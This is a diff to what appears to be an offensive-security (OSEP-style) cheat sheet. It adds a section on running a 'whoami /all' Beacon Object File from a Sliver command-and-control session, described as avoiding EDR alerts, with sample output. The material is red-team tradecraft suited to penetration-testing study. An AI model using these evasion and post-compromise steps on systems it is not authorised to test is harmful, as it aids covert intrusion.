@@ -78,6 +78,7 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 		- [Subnet Access](#subnet-access)
 		- [Port Forwarding through Ligolo](#port-forwarding-through-ligolo)
 - [Lateral Movement](#lateral-movement)
+	- [BOF whoami](#bof-whoami)
 	- [PsExec](#psexec)
 	- [jump-psexec](#jump-psexec)
 	- [jump-wmiexec](#jump-wmiexec)
@@ -1342,11 +1343,26 @@ curl -k --negotiate -u : 'http://machine05.domain.com/Internal/GetCPULoad' -X PO
 
 
 
-
-
-
-
 ## Lateral Movement
+
+### BOF-whoami
+A BOF (Beacon Object File) that runs whoami /all in a more safe way because running it from a shell can trigger an alert in EDRs
+```bash
+sliver (http-OSEP-4444) > sa-whoami 
+
+[*] Successfully executed sa-whoami
+[*] Got output:
+
+UserName        SID
+====================== ====================================
+<SNIF>
+
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,  
+<SNIF>      
+```
 
 ### PsExec
 
@@ -2777,3 +2793,6 @@ sliver > armory install all
 ```
 
 
+
+
+[def]: #bof-whoami
